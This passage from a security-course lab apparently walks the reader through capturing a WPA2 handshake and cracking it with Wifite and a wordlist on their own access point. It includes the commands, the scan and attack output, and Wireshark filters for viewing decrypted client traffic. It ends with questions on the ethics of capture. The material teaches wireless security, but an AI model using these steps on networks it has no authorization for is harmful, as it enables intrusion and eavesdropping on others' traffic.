
Wifite will use a default file,
/usr/share/dict/wordlist-probable.txt.

You can examine the default wordlist with **cat -n** (**-n** prints the line numbers) and **grep** (to search for a string), like this:

```
cat -n /usr/share/dict/wordlist-probable.txt | grep
weissman
```

In this case, there are two entries in the wordlist-probable.txt file that contain the string weissman (weissman on line 21682 and weissmann on line 78719). Substitute another string for weissman to search the file for other words. You can view the entire file with the **less** utility by typing the following:

```
cat -n /usr/share/dict/wordlist-probable.txt | less
```

Advance page by page with the spacebar, or line by line with the up- and down-arrow keys (which can be held down for fast scrolling) or the ENTER key. Press **q** to quit.

Alternatively, you can open the file in a text editor like vim by typing the following:

```
vim /usr/share/dict/wordlist-probable.txt
```

Advance with the arrow keys. Press ESC, **:**, **q**, and ENTER to quit.

Alternatively, you can use rockyou.txt, which comes with Kali Linux, as you did to crack passwords in Chapter 11.

c. To see Wifite help, execute the following command:

```
wifite -help
```

In the WPA section, notice the following items related to handshakes (hs) and dictionary (dict) files:

+   - **--new-hs** Captures new handshakes and ignores existing handshakes in hs (off by default)
+   - **--dict [file]** File containing passwords for cracking (the default is /usr/share/dict/wordlist-probable.txt)

2b, 2d. Feel free to crop or redact any portion of the screenshots for privacy.

Step 2 Discover targets and clients with Wifite and then launch an attack to capture the WPA2 password.

+   a. Start Wifite with the command

```
sudo wifite --new-hs --dict ./crack-it
```

where **crack-it** is the name of the text file in the current directory containing the WPA2 password of your SSID.

Wifite will start scanning, as shown in Figure 12-6.

![](img/6e921d997751f0a0f87e5170ac9657a1_385_0.png)

## FIGURE 12-6 Wifite starting

Wifite will find targets (APs) and clients. Give it a few minutes to collect information and many clients. You’ll see a list of targets and the number of clients shortly thereafter, as shown in Figure 12-7.

```
[+] Scanning. Found 30 target(s), 25 client(s). Ctrl+C when ready ^C
NUM       ESSID                 CH  ENCR   POWER  WPS?  CLIENT
---       ----                  --  ----   -----  ----  ------
1         [blurred]            11  WPA-P  49db   yes   1
2         [blurred]            11  WPA-P  39db   yes   8
3         [blurred]             9  WPA-P  18db   yes
4         [blurred]             1  WPA-P  17db   no    1
5         [blurred]            11  WPA-P  17db   no    1
6         [blurred]             5  WPA-P  16db   no
7         [blurred]             9  WPA-P  15db   yes
8         [blurred]             5  WPA-P  15db   yes   1
9         [blurred]             9  WPA-P  15db   no
10        [blurred]             8  WPA-P  14db   yes
11        [blurred]             8  WPA-P  13db   yes
12        [blurred]            11  WPA-P  13db   yes
13        [blurred]             4  WPA-P  13db   yes
14        [blurred]             5  WPA-P  13db   yes
15        [blurred]            11  WPA-P  13db   no
16        [blurred]            11  WPA-P  12db   yes
17        [blurred]             6  WPA-P  12db   no
18        [blurred]             2  WPA-P  11db   yes
19        [blurred]             3  WPA-P  11db   yes   5
20        [blurred]             5  WPA-P  11db   yes
21        [blurred]             1  WPA-P  10db   yes   2
22        [blurred]            11  WPA-P  10db   yes   3
23        [blurred]             6  WPA-P  10db   no
24        [blurred]             8  WPA-P  10db   yes
25        [blurred]            11  WPA-P  10db   no    2
26        [blurred]             2  WPA-P   9db   yes
27        [blurred]             6  WPA-P   9db   no
28        [blurred]             6  WPA-P   8db   no
29        [blurred]             5  WPA-P   8db   no    1
30        [blurred]             5  WPA-P   7db   yes
[+] select target(s) (1-30) separated by commas, dashes or all: 2
```

## FIGURE 12-7 Cracking WPA2 with Wifite

b. Press ESC to stop (as shown in Figure 12-7) when a few clients have been found for your AP. At the prompt, type the number representing your access point for the target (also shown in Figure 12-7). You’ll notice attacks starting. Press ESC to skip the first attack, WPS Pixie dust, and then press c or ENTER to continue, as shown in Figure 12-8.

```
[+] (1/1) Starting attacks against ████████████ (███)
[+] ███ (39db) WPS Pixie-Dust: [5m0s] Waiting for target to appear ... ^C
[!] Interrupted

[+] 4 attack(s) remain
[+] Do you want to continue attacking, or exit (c, e)? c
[+] ███ (36db) WPS NULL PIN: [4m53s] Sending ID ^C
[!] Interrupted

[+] 3 attack(s) remain
[+] Do you want to continue attacking, or exit (c, e)? c
[+] ███ (38db) WPS PIN Attack: [2s] (0.00%) Initializing ^C
[!] Interrupted

[+] 2 attack(s) remain
[+] Do you want to continue attacking, or exit (c, e)? c
[!] Skipping PMKID attack, missing required tools: hcxpcapngtool
[+] ███ (37db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (37db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (38db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (39db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (37db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (37db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (39db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (39db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (40db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (40db) WPA Handshake capture: Captured handshake
[+] saving copy of handshake to hs/handshake_████████████.cap saved

[+] analysis of captured handshake file:
[+]   tshark: .cap file contains a valid handshake for ████████████
[!] aircrack: .cap file does not contain a valid handshake

[+] Cracking WPA Handshake: Running aircrack-ng with crack-it wordlist
[+] Cracking WPA Handshake: 100.00% ETA: 0s @ 238.0kps (current key: )
[+] Cracked WPA Handshake PSK: ████████████

[+]     Access Point Name: ██
[+]     Access Point BSSID: ████████████
[+]             Encryption: WPA
[+]         Handshake File: hs/handshake_████████████████████.cap
[+]         PSK (password): █████████████!
[+] saved crack result to cracked.json (7 total)
[+] Finished attacking 1 target(s), exiting
```

wireshark/

In Wireshark, filter by eapol, and you’ll see multiple EAPoL handshakes. To see the deauthentication frames, filter by wlan.fc.type_subtype == 12. Use || or the or keyword between multiple filters to filter by at least one of them (logical OR).

With the EAPoL in the current capture, Wireshark will be able to decrypt packets from each client that was deauthenticated and reauthenticated. Do not stop the capture; otherwise, you’ll have to deauthenticate the clients again to view decrypted new traffic. You’ll still be able to view decrypted traffic to that point, though, if you stop the capture.

+   b. In Wireshark, filter by ip.addr == 192.168.1.0/24 (use your network ID and subnet mask) to see all the decrypted packets now. Notice the source IP addresses.

+   c. Send pings to those IP addresses and filter by icmp in Wireshark. You’ll be able to sniff ICMP (Internet Control Message Protocol) in plaintext (from clients that reauthenticated) in Wireshark now.

+   d. Send pings from the clients that reauthenticated to fully qualified domain names (FQDNs) like www.google.com. You’ll be able to sniff the DNS and ICMP in plaintext (from clients that reauthenticated) in Wireshark now.

+   e. Open up a browser on the clients that reauthenticated and go to various websites. You’ll notice in Wireshark that TLS still encrypts to and from websites that use encryption, though, as seen in Chapter 7.

## Lab Analysis

+   1. Should capturing wireless traffic on any network be allowed?

+   2. Why is capturing wireless traffic on networks under your control a form of cybersecurity?
